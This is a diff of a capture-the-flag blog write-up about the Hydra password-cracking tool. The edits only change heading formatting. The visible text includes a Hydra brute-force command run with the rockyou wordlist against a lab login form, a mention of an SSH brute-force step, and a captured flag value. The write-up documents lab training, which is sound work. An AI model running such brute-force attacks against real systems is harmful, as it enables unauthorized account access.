@@ -15,7 +15,7 @@ Open the target in a browser and use Developer Tools → Network to capture the 
 We used these exact values in the http-post-form syntax required by Hydra.
 
 ![Pasted image 20260419103420](/images/blog/hydra_img/Pasted_image_20260419103420.png)
-## Web brute force
+ Web brute force
 
 **Command used:**
 
@@ -33,7 +33,7 @@ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.201.107.194 http-post-form
 
 ![Pasted image 20260419103430](/images/blog/hydra_img/Pasted_image_20260419103430.png)
 
-## SSH brute force (flag2)
+ SSH brute force (flag2)
 
 **Command used:**
 
@@ -57,7 +57,7 @@ ls -la
 cat flag2.txt
 ```
 
-**Flag 2 content (from /home/molly/flag2.txt):  
+**Flag 2 content (from /home/molly/flag2.txt): 
 ****_THM{c8eeb0468febbadea859baeb33b2541b}_**
 
 ![Pasted image 20260419103459](/images/blog/hydra_img/Pasted_image_20260419103459.png)
